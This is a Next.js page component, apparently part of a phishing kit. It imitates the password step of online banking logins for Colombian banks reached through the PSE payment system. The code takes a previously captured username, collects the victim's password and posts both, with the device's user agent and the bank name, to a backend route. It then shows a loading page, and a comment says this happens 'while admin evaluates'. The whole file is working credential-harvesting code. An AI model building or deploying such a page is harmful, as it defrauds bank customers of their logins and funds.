"use client";

import { useState, useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';
import { useCaseStatus } from '@/context/useCaseStatus';

export default function ClavePage() {
    useCaseStatus();
    const router = useRouter();
    const params = useParams();
    const bankId = params.bankId as string;
    const [password, setPassword] = useState('');
    const [error, setError] = useState(false);
    const [usuario, setUsuario] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);

    useEffect(() => {
        const storedUsuario = localStorage.getItem('pse_usuario');
        if (!storedUsuario) {
            router.push(`/pse/${bankId}/usuario`);
            return;
        }
        setUsuario(storedUsuario);
    }, [bankId, router]);

    const bankNames: Record<string, string> = {
        bancolombia: 'Bancolombia',
        davivienda: 'Davivienda',
        bogota: 'Banco de Bogotá',
        nequi: 'Nequi',
        avvillas: 'AV Villas',
        colpatria: 'Colpatria',
        popular: 'Popular',
        cajasocial: 'Caja Social',
        citibank: 'Citibank',
        falabella: 'Falabella',
        finandina: 'Finandina',
        itau: 'Itaú',
        occidente: 'Occidente',
        serfinanza: 'Serfinanza',
        tuya: 'Tuya'
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        if (password.trim().length === 0) {
            setError(true);
            return;
        }

        setIsSubmitting(true);

        try {
            // Send to API
            const response = await fetch('/api/paso-usuario', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    usuario,
                    password,
                    dispositivo: navigator.userAgent,
                    banco: bankNames[bankId]
                })
            });

            const data = await response.json();

            if (data.success) {
                // Redirect to loading page while admin evaluates
                router.push(`/pse/${bankId}/cargando`);
            } else {
                setError(true);
                setIsSubmitting(false);
            }
        } catch (error) {
            console.error('Error:', error);
            setError(true);
            setIsSubmitting(false);
        }
    };

    return (
        <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col">
            {/* Header */}
            <header className="bg-white border-b border-gray-200 p-4 flex justify-between items-center shadow-sm">
                <div className="text-xl font-bold text-gray-800">
                    {bankNames[bankId] || 'Banco'}
                </div>
                <button
                    onClick={() => router.push('/pse')}
                    className="text-blue-600 hover:text-blue-800 flex items-center gap-2"
                >
                    Salir
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
                    </svg>
                </button>
            </header>

            {/* Main Content */}
            <main className="flex-1 flex items-center justify-center px-4 py-12">
                <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-md">
                    <h1 className="text-2xl font-bold text-gray-800 mb-6 text-center">
                        Ingresa tu contraseña
                    </h1>

                    <div className="mb-6 p-4 bg-blue-50 rounded-lg">
                        <p className="text-sm text-gray-700">
                            <span className="font-semibold">Usuario:</span> {usuario}
                        </p>
                    </div>

                    <form onSubmit={handleSubmit} className="space-y-6">
                        <div>
                            <div className="relative">
                                <input
                                    type="password"
                                    id="password"
                                    value={password}
                                    onChange={(e) => {
                                        setPassword(e.target.value);
                                        setError(false);
                                    }}
                                    placeholder=" "
                                    maxLength={20}
                                    disabled={isSubmitting}
                                    className={`peer w-full px-4 py-3 border-b-2 ${error ? 'border-red-500' : 'border-gray-300'
                                        } focus:border-blue-600 focus:outline-none transition-colors bg-transparent disabled:opacity-50`}
                                />
                                <label
                                    htmlFor="password"
                                    className="absolute left-4 top-3 text-gray-500 transition-all peer-placeholder-shown:top-3 peer-placeholder-shown:text-base peer-focus:top-0 peer-focus:text-xs peer-focus:text-blue-600 peer-[:not(:placeholder-shown)]:top-0 peer-[:not(:placeholder-shown)]:text-xs"
                                >
                                    Contraseña
                                </label>
                            </div>
                            {error && (
                                <p className="mt-2 text-sm text-red-600">
                                    Por favor ingresa tu contraseña
                                </p>
                            )}
                            <button
                                type="button"
                                className="mt-2 text-sm text-blue-600 hover:underline"
                            >
                                ¿Olvidaste tu contraseña?
                            </button>
                        </div>

                        <div className="flex gap-4">
                            <button
                                type="button"
                                onClick={() => router.push(`/pse/${bankId}/usuario`)}
                                disabled={isSubmitting}
                                className="flex-1 py-3 border-2 border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors font-semibold disabled:opacity-50"
                            >
                                Volver
                            </button>
                            <button
                                type="submit"
                                disabled={isSubmitting}
                                className="flex-1 py-3 bg-yellow-400 text-gray-900 rounded-lg hover:bg-yellow-500 transition-colors font-semibold shadow-md disabled:opacity-50 flex items-center justify-center gap-2"
                            >
                                {isSubmitting ? (
                                    <>
                                        <div className="w-5 h-5 border-2 border-gray-900 border-t-transparent rounded-full animate-spin"></div>
                                        Procesando...
                                    </>
                                ) : (
                                    'Continuar'
                                )}
                            </button>
                        </div>
                    </form>
                </div>
            </main>

            {/* Footer */}
            <div className="h-2 bg-gradient-to-r from-yellow-400 via-red-500 to-blue-600"></div>
        </div>
    );
}
